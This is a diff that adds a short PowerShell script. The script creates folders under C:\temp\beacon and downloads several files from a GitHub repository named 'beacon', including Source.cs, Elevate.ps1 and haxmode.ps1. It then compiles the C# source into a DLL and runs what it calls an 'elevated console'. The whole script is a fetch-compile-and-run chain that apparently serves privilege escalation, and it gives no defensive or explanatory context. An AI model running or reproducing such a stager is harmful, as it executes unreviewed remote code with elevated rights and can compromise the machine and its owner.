@@ -1,0 +1,17 @@
+# Create the necessary directories
+mkdir C:\temp
+mkdir C:\temp\beacon
+mkdir C:\temp\beacon\elevate
+
+# Grab the tools: Source.cs, compile.ps1, Elevate.ps1, batch.bat, and haxmode.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/batch.bat > C:\temp\beacon\elevate\batch.bat
+
+# Compile the C# source code into a DLL
+C:\temp\beacon\elevate\compile.ps1
+
+# Execute the elevated console
+C:\temp\beacon\elevate\Elevate.ps1
